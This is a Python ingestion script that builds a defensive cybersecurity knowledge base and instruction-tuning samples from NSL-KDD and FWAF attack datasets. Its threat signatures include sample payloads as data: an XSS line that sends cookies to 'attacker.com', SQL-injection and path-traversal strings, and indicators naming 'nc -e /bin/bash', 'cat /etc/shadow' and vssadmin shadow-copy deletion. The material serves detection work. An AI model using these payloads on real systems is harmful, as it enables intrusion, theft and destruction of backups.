"""
Ingests cybersecurity datasets from the curated repository (JunfengGo/Dataset-for-cybersecurity,
NSL-KDD, and FWAF Web Attack Payloads) into a high-performance defensive SQLite knowledge base.
"""
import json
import os
import re
import sqlite3
import sys
import urllib.parse
import urllib.request
from pathlib import Path

OUTPUT_DIR = Path(__file__).resolve().parent.parent / "data" / "security"
DB_PATH = OUTPUT_DIR / "cybersecurity_kb.db"
SFT_JSONL_PATH = OUTPUT_DIR / "cybersecurity_sft_sample.jsonl"

NSL_KDD_URL = "https://raw.githubusercontent.com/defcom17/NSL_KDD/master/KDDTest%2B.txt"
FWAF_BADQUERIES_URL = "https://raw.githubusercontent.com/faizann24/Fwaf-Machine-Learning-driven-Web-Application-Firewall/master/badqueries.txt"

# NSL-KDD Attack Classification Mapping
ATTACK_CLASSES = {
    "normal": "Normal",
    # DoS (Denial of Service)
    "apache2": "DoS", "back": "DoS", "land": "DoS", "mailbomb": "DoS",
    "neptune": "DoS", "pod": "DoS", "processtable": "DoS", "smurf": "DoS",
    "teardrop": "DoS", "udpstorm": "DoS",
    # Probe (Surveillance / Port Scan)
    "ipsweep": "Probe", "mscan": "Probe", "nmap": "Probe",
    "portsweep": "Probe", "saint": "Probe", "satan": "Probe",
    # R2L (Remote to Local unauthorized access)
    "ftp_write": "R2L", "guess_passwd": "R2L", "httptunnel": "R2L",
    "imap": "R2L", "multihop": "R2L", "named": "R2L", "phf": "R2L",
    "sendmail": "R2L", "snmpgetattack": "R2L", "snmpguess": "R2L",
    "spy": "R2L", "warezclient": "R2L", "warezmaster": "R2L",
    "xlock": "R2L", "xsnoop": "R2L",
    # U2R (User to Root privilege escalation)
    "buffer_overflow": "U2R", "loadmodule": "U2R", "perl": "U2R",
    "ps": "U2R", "rootkit": "U2R", "sqlattack": "U2R", "xterm": "U2R",
}

CURATED_SIGNATURES = [
    {
        "name": "SYN Flood (Neptune)",
        "category": "DoS",
        "mitre_attack_id": "T1498.001",
        "cve_cwe": "CWE-400",
        "description": "Exhausts server transmission control block (TCB) state by transmitting thousands of TCP SYN packets without completing the three-way handshake (leaving half-open sockets).",
        "indicators_of_compromise": "High count of inbound TCP SYN packets with flag S0/REJ, identical destination ports, 0 dst_bytes, elevated serror_rate (>0.90), spoofed or random source IPs.",
        "severity": "HIGH",
        "defensive_mitigation": "Enable SYN Cookies (net.ipv4.tcp_syncookies = 1), lower TCP synack retries, configure iptables/nftables SYN rate-limiting, and utilize upstream cloud DDoS scrubbing.",
        "example_pattern": "protocol=tcp, flag=S0/REJ, serror_rate=1.00, count>100, dst_bytes=0"
    },
    {
        "name": "ICMP Broadcast Flood (Smurf)",
        "category": "DoS",
        "mitre_attack_id": "T1498",
        "cve_cwe": "CWE-400",
        "description": "Sends forged ICMP Echo Requests (pings) with the victim's spoofed source IP to broadcast addresses, causing multiple responding hosts to flood the victim.",
        "indicators_of_compromise": "Surge in ICMP Echo Reply traffic (eco_i / ecr_i), flag SF, high packet frequency with minimal interval variance.",
        "severity": "HIGH",
        "defensive_mitigation": "Disable directed broadcasts on perimeter routers (no ip directed-broadcast), rate-limit ICMP at border firewalls, verify Reverse Path Forwarding (uRPF).",
        "example_pattern": "protocol=icmp, service=eco_i/ecr_i, srv_count>50"
    },
    {
        "name": "Network Reconnaissance / Port Sweep",
        "category": "Probe",
        "mitre_attack_id": "T1046",
        "cve_cwe": "CWE-200",
        "description": "Systematic scanning of host ports (SYN stealth scan, FIN/NULL/XMAS scans) to map listening services, daemon banners, and potential ingress points.",
        "indicators_of_compromise": "Rapid connections to sequential or random ports from single source IP, elevated REJ/RSTO flags, diff_srv_rate approaching 1.0, high host count with single request.",
        "severity": "MEDIUM",
        "defensive_mitigation": "Deploy stateful IDS/IPS (Suricata/Snort), configure Fail2Ban / auto-shun for port-scanning sources, implement port knocking or tarpits.",
        "example_pattern": "protocol=tcp, flag=REJ, diff_srv_rate>0.80, count>20"
    },
    {
        "name": "SQL Injection (SQLi) - Classic Tautology & Union",
        "category": "Web Attack",
        "mitre_attack_id": "T1190",
        "cve_cwe": "CWE-89",
        "description": "Injects malicious SQL fragments into input fields to manipulate backend relational database queries, bypassing authentication or exfiltrating schema data.",
        "indicators_of_compromise": "Query strings containing `' OR 1=1--`, `UNION SELECT`, `SLEEP()`, `BENCHMARK()`, `information_schema.tables`, double dashes or inline comment markers.",
        "severity": "CRITICAL",
        "defensive_mitigation": "Enforce parameterized queries (Prepared Statements / ORM binding), apply least privilege on DB users, validate inputs against strict whitelists, deploy WAF inspection.",
        "example_pattern": "admin' OR '1'='1' -- | UNION SELECT null, username, password FROM users--"
    },
    {
        "name": "Cross-Site Scripting (XSS) - Reflected & Stored",
        "category": "Web Attack",
        "mitre_attack_id": "T1059.007",
        "cve_cwe": "CWE-79",
        "description": "Injects client-side executable script tags or event handlers into web pages viewed by other users, allowing session cookie theft or DOM manipulation.",
        "indicators_of_compromise": "Payloads containing `<script>`, `onerror=`, `onload=`, `javascript:`, `document.cookie`, `eval()`, base64 obfuscated script blocks.",
        "severity": "HIGH",
        "defensive_mitigation": "Context-aware HTML/JS output encoding, deploy strict Content Security Policy (CSP: default-src 'self'), set HttpOnly and SameSite flags on session cookies.",
        "example_pattern": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script> | <img src=x onerror=alert(1)>"
    },
    {
        "name": "Path Traversal & Local File Inclusion (LFI)",
        "category": "Web Attack",
        "mitre_attack_id": "T1083",
        "cve_cwe": "CWE-22",
        "description": "Exploits unvalidated file paths to navigate outside intended web root directories and access arbitrary system configuration files.",
        "indicators_of_compromise": "URLs or parameters containing `../`, `..\\`, `%2e%2e%2f`, `/etc/passwd`, `C:\\Windows\\win.ini`, `environ`, `proc/self/cmdline`.",
        "severity": "HIGH",
        "defensive_mitigation": "Sanitize path inputs using canonical path resolution (`Path.resolve()`), ensure files are served only from a strictly jailed subdirectory, disallow user-controlled filenames.",
        "example_pattern": "/view?file=../../../../etc/passwd | ..%2F..%2F..%2Fwindows%2Fwin.ini"
    },
    {
        "name": "Remote Command Execution (RCE)",
        "category": "Web Attack",
        "mitre_attack_id": "T1059",
        "cve_cwe": "CWE-78",
        "description": "Injects shell metacharacters into server-side commands, granting arbitrary shell execution on the host operating system.",
        "indicators_of_compromise": "Query parameters containing `;`, `&&`, `|`, `` ` ``, `$(...)`, `whoami`, `cat /etc/shadow`, `powershell.exe -enc`, `nc -e /bin/bash`.",
        "severity": "CRITICAL",
        "defensive_mitigation": "Never invoke shell interpreters with unsanitized parameters. Pass argument lists to subprocesses with `shell=False`, run applications under restricted low-privilege service accounts in read-only containers.",
        "example_pattern": "; cat /etc/passwd | ; id; uname -a | & dir C:\\"
    },
    {
        "name": "Cobalt Strike / C2 Beaconing Activity",
        "category": "C2",
        "mitre_attack_id": "T1071.001",
        "cve_cwe": "CWE-924",
        "description": "Compromised endpoint transmits periodic HTTP/HTTPS or DNS requests with randomized sleep jitter back to adversary Command and Control infrastructure.",
        "indicators_of_compromise": "Regular outbound HTTPS beacons with characteristic jitter, suspicious User-Agents, self-signed SSL certificates, outbound connections to dynamic DNS or newly registered domains.",
        "severity": "CRITICAL",
        "defensive_mitigation": "Deploy egress proxy inspection, monitor network traffic with JA3/JA3S TLS fingerprinting, terminate suspicious outbound sessions, isolate affected endpoint immediately via EDR.",
        "example_pattern": "Persistent outbound HTTP POST to uncategorized IP on port 443 with uniform packet size and 30s jitter interval."
    },
    {
        "name": "Pass-the-Hash / Lateral Movement",
        "category": "R2L",
        "mitre_attack_id": "T1550.002",
        "cve_cwe": "CWE-287",
        "description": "Adversary captures NTLM password hash from memory (LSASS) and authenticates across the domain without needing the cleartext password.",
        "indicators_of_compromise": "Windows Security Event ID 4624 (Logon Type 3) using NTLM instead of Kerberos between internal workstations, unusual administrative shares (ADMIN$, C$) access.",
        "severity": "HIGH",
        "defensive_mitigation": "Enable LSA Protection (RunAsPPL), enforce Credential Guard, disable NTLMv1, restrict remote SAM connections, restrict local admin accounts across workstations (LAPS).",
        "example_pattern": "Event ID 4624: Logon Type 3, Authentication Package: NTLM, Source IP: Internal workstation subnet."
    },
    {
        "name": "Ransomware Encryption Artifacts & Shadow Copy Deletion",
        "category": "Malware",
        "mitre_attack_id": "T1486",
        "cve_cwe": "CWE-400",
        "description": "Malicious payload executes commands to inhibit system recovery and mass-encrypts user data using high-speed symmetric algorithms (AES/ChaCha20).",
        "indicators_of_compromise": "Execution of `vssadmin delete shadows /all /quiet`, `bcdedit /set {default} recoveryenabled No`, rapid file renaming across drives with high file entropy (>7.9).",
        "severity": "CRITICAL",
        "defensive_mitigation": "Enforce tamper-resistant offline immutable backups, deploy behavioral EDR blocking vssadmin execution, enable Protected Folders/Controlled Folder Access in Windows Defender.",
        "example_pattern": "cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} bootstatuspolicy ignoreallfailures"
    }
]

DATASET_CATALOG_ENTRIES = [
    {
        "name": "NSL-KDD",
        "category": "NIDS",
        "source_url": "https://github.com/defcom17/NSL_KDD",
        "feature_count": 41,
        "sample_types": "TCP/UDP/ICMP connection records, 4 attack categories (DoS, Probe, R2L, U2R) + Benign traffic.",
        "recommended_models": "Random Forest, XGBoost, Multilayer Perceptron (MLP), LightGBM.",
        "evaluation_metrics": "Accuracy (99%+ on train, 82%+ on difficult test), Precision, Recall, FPR.",
        "description": "Refined version of the classic KDD Cup 99 dataset that removed duplicate records, preventing biased classifier evaluations and providing standard benchmark test splits (KDDTest+, KDDTest-21)."
    },
    {
        "name": "FWAF (Machine Learning Web Application Firewall)",
        "category": "WAF",
        "source_url": "https://github.com/faizann24/Fwaf-Machine-Learning-driven-Web-Application-Firewall",
        "feature_count": 65,
        "sample_types": "HTTP query strings, SQLi payloads, XSS injections, Path Traversals, Benign web queries.",
        "recommended_models": "TF-IDF + Logistic Regression, SVM, CNN-LSTM, Char-level Transformers.",
        "evaluation_metrics": "AUC-ROC (>0.98), Precision, Recall, False Positive Rate (<0.01).",
        "description": "Benchmark dataset of thousands of real-world malicious HTTP queries paired with clean web traffic for automated WAF rule generation and query anomaly detection."
    },
    {
        "name": "EMBER (Elastic Malware Benchmark for Empowering Researchers)",
        "category": "Malware",
        "source_url": "https://github.com/endgameinc/ember",
        "feature_count": 2381,
        "sample_types": "Extracted PE file features: Byte histogram, Byte entropy, Section info, Imports, Exports, Header info.",
        "recommended_models": "LightGBM, XGBoost, Deep Neural Networks.",
        "evaluation_metrics": "ROC AUC, Detection Rate at 1% False Positive Rate (FPR).",
        "description": "Standardized benchmark dataset of 1.1 million scanned Windows PE binaries designed for reproducible static malware classification research."
    },
    {
        "name": "Stratosphere IPS Datasets",
        "category": "NIDS / Botnet",
        "source_url": "https://stratosphereips.org/category/dataset.html",
        "feature_count": 15,
        "sample_types": "Full PCAP captures and NetFlow/BiFlow captures of real botnet malware infections (CTU-13 dataset).",
        "recommended_models": "Markov Models, LSTM, Graph Neural Networks, Isolation Forest.",
        "evaluation_metrics": "F1-Score, Time-to-Detect (TTD), Early Warning Accuracy.",
        "description": "High-fidelity behavioral dataset capturing genuine infected host network traffic alongside normal and background traffic for botnet C2 behavioral modeling."
    },
    {
        "name": "Drebin Android Malware Dataset",
        "category": "Malware",
        "source_url": "https://www.sec.cs.tu-bs.de/~danarp/drebin/",
        "feature_count": 545000,
        "sample_types": "123,453 Android apps (5,560 malware from 179 families): permissions, API calls, intents, network addresses.",
        "recommended_models": "Linear SVM with L2 regularization, Random Forest.",
        "evaluation_metrics": "Detection Rate (94%), False Positive Rate (1%).",
        "description": "Groundbreaking academic dataset for mobile security that extracts static manifest and bytecode features into broad vector spaces for lightweight device-level malware identification."
    },
    {
        "name": "CIC-IDS2017 / CSE-CIC-IDS2018",
        "category": "NIDS",
        "source_url": "https://www.unb.ca/cic/datasets/ids-2018.html",
        "feature_count": 80,
        "sample_types": "Modern enterprise network captures: Brute Force, Heartbleed, Botnet, DoS, DDoS, Web Attacks, Infiltration.",
        "recommended_models": "XGBoost, Random Forest, Temporal Convolutional Networks.",
        "evaluation_metrics": "Macro F1-Score, Detection Rate, Resource Consumption.",
        "description": "Widely adopted contemporary intrusion detection benchmark generated by the Canadian Institute for Cybersecurity simulating realistic network topologies and attack profiles."
    }
]


def init_db(db_path: Path) -> sqlite3.Connection:
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()

    cur.execute("""
    CREATE TABLE IF NOT EXISTS threat_signatures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT UNIQUE,
        category TEXT,
        mitre_attack_id TEXT,
        cve_cwe TEXT,
        description TEXT,
        indicators_of_compromise TEXT,
        severity TEXT,
        defensive_mitigation TEXT,
        example_pattern TEXT
    );
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS nsl_kdd_samples (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        protocol_type TEXT,
        service TEXT,
        flag TEXT,
        src_bytes INTEGER,
        dst_bytes INTEGER,
        count INTEGER,
        srv_count INTEGER,
        serror_rate REAL,
        rerror_rate REAL,
        same_srv_rate REAL,
        diff_srv_rate REAL,
        attack_label TEXT,
        attack_class TEXT,
        difficulty_level INTEGER
    );
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS waf_payload_samples (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        payload TEXT,
        label TEXT,
        source TEXT,
        confidence_risk TEXT,
        detection_tokens TEXT
    );
    """)

    cur.execute("""
    CREATE TABLE IF NOT EXISTS dataset_catalog (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT UNIQUE,
        category TEXT,
        source_url TEXT,
        feature_count INTEGER,
        sample_types TEXT,
        recommended_models TEXT,
        evaluation_metrics TEXT,
        description TEXT
    );
    """)

    cur.execute("CREATE INDEX IF NOT EXISTS idx_threat_name ON threat_signatures(name);")
    cur.execute("CREATE INDEX IF NOT EXISTS idx_threat_category ON threat_signatures(category);")
    cur.execute("CREATE INDEX IF NOT EXISTS idx_nsl_attack_class ON nsl_kdd_samples(attack_class);")
    cur.execute("CREATE INDEX IF NOT EXISTS idx_nsl_attack_label ON nsl_kdd_samples(attack_label);")
    cur.execute("CREATE INDEX IF NOT EXISTS idx_waf_label ON waf_payload_samples(label);")

    conn.commit()
    return conn


def populate_threat_signatures(conn: sqlite3.Connection):
    cur = conn.cursor()
    inserted = 0
    for sig in CURATED_SIGNATURES:
        cur.execute("""
        INSERT INTO threat_signatures (
            name, category, mitre_attack_id, cve_cwe, description,
            indicators_of_compromise, severity, defensive_mitigation, example_pattern
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(name) DO UPDATE SET
            description=excluded.description,
            indicators_of_compromise=excluded.indicators_of_compromise,
            defensive_mitigation=excluded.defensive_mitigation;
        """, (
            sig["name"], sig["category"], sig["mitre_attack_id"], sig["cve_cwe"],
            sig["description"], sig["indicators_of_compromise"], sig["severity"],
            sig["defensive_mitigation"], sig["example_pattern"]
        ))
        inserted += 1
    conn.commit()
    print(f"[OK] Indexed {inserted} curated defensive threat signatures.")


def populate_dataset_catalog(conn: sqlite3.Connection):
    cur = conn.cursor()
    inserted = 0
    for item in DATASET_CATALOG_ENTRIES:
        cur.execute("""
        INSERT INTO dataset_catalog (
            name, category, source_url, feature_count, sample_types,
            recommended_models, evaluation_metrics, description
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(name) DO UPDATE SET
            source_url=excluded.source_url,
            recommended_models=excluded.recommended_models,
            description=excluded.description;
        """, (
            item["name"], item["category"], item["source_url"], item["feature_count"],
            item["sample_types"], item["recommended_models"], item["evaluation_metrics"],
            item["description"]
        ))
        inserted += 1
    conn.commit()
    print(f"[OK] Indexed {inserted} benchmark dataset entries into catalog.")


def ingest_nsl_kdd(conn: sqlite3.Connection, max_records: int = 15000):
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM nsl_kdd_samples")
    existing = cur.fetchone()[0]
    if existing >= 5000:
        print(f"[OK] NSL-KDD benchmark table already contains {existing} records. Skipping download.")
        return

    print(f"[*] Downloading NSL-KDD test set from {NSL_KDD_URL}...")
    headers = {"User-Agent": "Aegis-Command-Center/1.0"}
    req = urllib.request.Request(NSL_KDD_URL, headers=headers)
    
    records = []
    with urllib.request.urlopen(req) as resp:
        for line_bytes in resp:
            line = line_bytes.decode("utf-8", errors="ignore").strip()
            if not line:
                continue
            parts = line.split(",")
            if len(parts) < 43:
                continue
            
            # Key features from NSL-KDD
            # 1: protocol_type, 2: service, 3: flag, 4: src_bytes, 5: dst_bytes
            # 22: count, 23: srv_count, 24: serror_rate, 26: rerror_rate
            # 28: same_srv_rate, 29: diff_srv_rate
            # 41: attack_label, 42: difficulty_level
            protocol = parts[1]
            service = parts[2]
            flag = parts[3]
            try:
                src_bytes = int(parts[4])
                dst_bytes = int(parts[5])
                count = int(parts[22])
                srv_count = int(parts[23])
                serror_rate = float(parts[24])
                rerror_rate = float(parts[26])
                same_srv_rate = float(parts[28])
                diff_srv_rate = float(parts[29])
                attack_label = parts[41].strip()
                difficulty = int(parts[42])
            except (ValueError, IndexError):
                continue

            attack_class = ATTACK_CLASSES.get(attack_label.lower(), "Unknown")
            records.append((
                protocol, service, flag, src_bytes, dst_bytes,
                count, srv_count, serror_rate, rerror_rate,
                same_srv_rate, diff_srv_rate, attack_label,
                attack_class, difficulty
            ))
            if len(records) >= max_records:
                break

    cur.executemany("""
    INSERT INTO nsl_kdd_samples (
        protocol_type, service, flag, src_bytes, dst_bytes,
        count, srv_count, serror_rate, rerror_rate,
        same_srv_rate, diff_srv_rate, attack_label,
        attack_class, difficulty_level
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, records)
    conn.commit()
    print(f"[OK] Ingested {len(records)} NSL-KDD traffic benchmark records.")


def ingest_waf_payloads(conn: sqlite3.Connection, max_records: int = 5000):
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM waf_payload_samples")
    existing = cur.fetchone()[0]
    if existing >= 1000:
        print(f"[OK] WAF payload table already contains {existing} records. Skipping download.")
        return

    print(f"[*] Downloading FWAF malicious queries from {FWAF_BADQUERIES_URL}...")
    headers = {"User-Agent": "Aegis-Command-Center/1.0"}
    req = urllib.request.Request(FWAF_BADQUERIES_URL, headers=headers)

    records = []
    with urllib.request.urlopen(req) as resp:
        for line_bytes in resp:
            raw_line = line_bytes.decode("utf-8", errors="ignore").strip()
            if not raw_line:
                continue
            decoded = urllib.parse.unquote(raw_line)
            
            # Categorize attack
            lower = decoded.lower()
            if any(k in lower for k in ["select", "union", "insert", "update", "delete", "drop", "--", "or 1=1"]):
                label = "sqli"
                risk = "CRITICAL"
                tokens = "SQL_KEYWORDS"
            elif any(k in lower for k in ["<script", "onerror=", "onload=", "javascript:", "alert(", "<img"]):
                label = "xss"
                risk = "HIGH"
                tokens = "DOM_INJECTION"
            elif any(k in lower for k in ["../", "..\\", "etc/passwd", "win.ini"]):
                label = "path_traversal"
                risk = "HIGH"
                tokens = "DIRECTORY_TRAVERSAL"
            elif any(k in lower for k in [";", "&&", "|", "whoami", "powershell", "bin/sh"]):
                label = "cmd_injection"
                risk = "CRITICAL"
                tokens = "OS_COMMAND"
            else:
                label = "web_exploit"
                risk = "MEDIUM"
                tokens = "ANOMALOUS_PAYLOAD"

            records.append((decoded[:500], label, "FWAF", risk, tokens))
            if len(records) >= max_records:
                break

    # Add standard benign requests for balanced verification
    benign_samples = [
        ("/api/v1/products?category=electronics&sort=asc&page=1", "benign", "Standard", "LOW", "CLEAN_QUERY"),
        ("/search?q=wireless+headphones&brand=sony", "benign", "Standard", "LOW", "CLEAN_QUERY"),
        ("/user/profile?user_id=10492&theme=dark", "benign", "Standard", "LOW", "CLEAN_QUERY"),
        ("/checkout/summary?cart_token=a9f3b89c-4421-49e0", "benign", "Standard", "LOW", "CLEAN_QUERY"),
        ("/index.html?lang=en-US", "benign", "Standard", "LOW", "CLEAN_QUERY"),
        ("/assets/images/logo.png?v=2.4", "benign", "Standard", "LOW", "CLEAN_QUERY"),
        ("/api/status?service=health_check", "benign", "Standard", "LOW", "CLEAN_QUERY"),
        ("/dashboard/metrics?period=last_30_days", "benign", "Standard", "LOW", "CLEAN_QUERY"),
    ]
    for b in benign_samples:
        records.append(b)

    cur.executemany("""
    INSERT INTO waf_payload_samples (
        payload, label, source, confidence_risk, detection_tokens
    ) VALUES (?, ?, ?, ?, ?)
    """, records)
    conn.commit()
    print(f"[OK] Ingested {len(records)} WAF payload benchmark records.")


def generate_sft_dataset(conn: sqlite3.Connection, num_samples: int = 500):
    """Generates high-quality defensive cybersecurity instruction-tuning dialogues."""
    print(f"[*] Generating {num_samples} defensive cybersecurity fine-tuning pairs...")
    cur = conn.cursor()

    cur.execute("SELECT name, category, mitre_attack_id, cve_cwe, description, indicators_of_compromise, severity, defensive_mitigation FROM threat_signatures")
    sigs = cur.fetchall()

    sft_records = []
    
    # Generate Threat Signature Dialogues
    for s in sigs:
        name, cat, mitre, cve, desc, iocs, sev, mit = s
        prompt = f"Security Analyst Prompt: Explain the threat profile, indicators of compromise, and defensive mitigation strategy for {name} ({mitre})."
        response = (
            f"### Threat Profile: {name}\n"
            f"- **Category:** {cat}\n"
            f"- **MITRE ATT&CK Technique:** {mitre}\n"
            f"- **Classification:** {cve}\n"
            f"- **Severity Level:** {sev}\n\n"
            f"### Overview & Mechanism\n{desc}\n\n"
            f"### Indicators of Compromise (IoCs)\n{iocs}\n\n"
            f"### Defensive Mitigation Playbook\n{mit}\n\n"
            f"*Defensive Policy Notice: All guidance strictly adheres to authorization verification and incident containment standards.*"
        )
        sft_records.append({
            "instruction": "You are Aegis-Defense, an elite autonomous cybersecurity defensive intelligence agent. Provide precise, actionable analysis for threat detection, incident triage, and hardening.",
            "input": prompt,
            "output": response
        })

    # Generate NSL-KDD Traffic Triage Dialogues
    cur.execute("""
    SELECT protocol_type, service, flag, src_bytes, dst_bytes, count, serror_rate, rerror_rate, attack_label, attack_class
    FROM nsl_kdd_samples
    ORDER BY RANDOM() LIMIT 200
    """)
    traffic_samples = cur.fetchall()
    for t in traffic_samples:
        proto, srv, flag, s_bytes, d_bytes, count, s_err, r_err, label, a_class = t
        prompt = (
            f"Analyze network telemetry flow: Protocol={proto}, Service={srv}, Flag={flag}, "
            f"SrcBytes={s_bytes}, DstBytes={d_bytes}, ConnectionCount={count}, SerrorRate={s_err:.2f}, RerrorRate={r_err:.2f}."
        )
        if a_class == "Normal":
            response = (
                f"### Traffic Analysis: Benign Connection\n"
                f"- **Classification:** {a_class} ({label})\n"
                f"- **Protocol / Service:** {proto.upper()} over {srv}\n"
                f"- **Assessment:** Connection exhibits standard handshake completion ({flag}) with healthy byte ratios and negligible error rates ({s_err:.2f}). No defensive action required."
            )
        else:
            response = (
                f"### Traffic Analysis: Anomaly Detected [{a_class.upper()}]\n"
                f"- **Attack Signature:** {label}\n"
                f"- **Threat Class:** {a_class}\n"
                f"- **Anomalous Indicators:** Flag `{flag}` with high error rate ({s_err:.2f}) and connection density ({count} connections).\n"
                f"- **Defensive Action:** Isolate offending IP, inspect state table, apply rate-limiting rules, and alert SOC analysts."
            )
        sft_records.append({
            "instruction": "You are Aegis-Defense, an elite autonomous cybersecurity defensive intelligence agent. Analyze network connection telemetry and identify potential intrusions.",
            "input": prompt,
            "output": response
        })

    with open(SFT_JSONL_PATH, "w", encoding="utf-8") as f:
        for rec in sft_records:
            f.write(json.dumps(rec) + "\n")
    
    print(f"[OK] Saved {len(sft_records)} defensive instruction-tuning pairs to {SFT_JSONL_PATH}")


def main():
    print("=" * 65)
    print("Aegis Cybersecurity Knowledge Base Ingestion")
    print("=" * 65)
    conn = init_db(DB_PATH)
    try:
        populate_threat_signatures(conn)
        populate_dataset_catalog(conn)
        ingest_nsl_kdd(conn, max_records=10000)
        ingest_waf_payloads(conn, max_records=3000)
        generate_sft_dataset(conn)
    finally:
        conn.close()
    
    size_mb = DB_PATH.stat().st_size / (1024 * 1024)
    print("=" * 65)
    print(f"[SUCCESS] Cybersecurity database created at: {DB_PATH} ({size_mb:.2f} MB)")
    print("=" * 65)


if __name__ == "__main__":
    main()
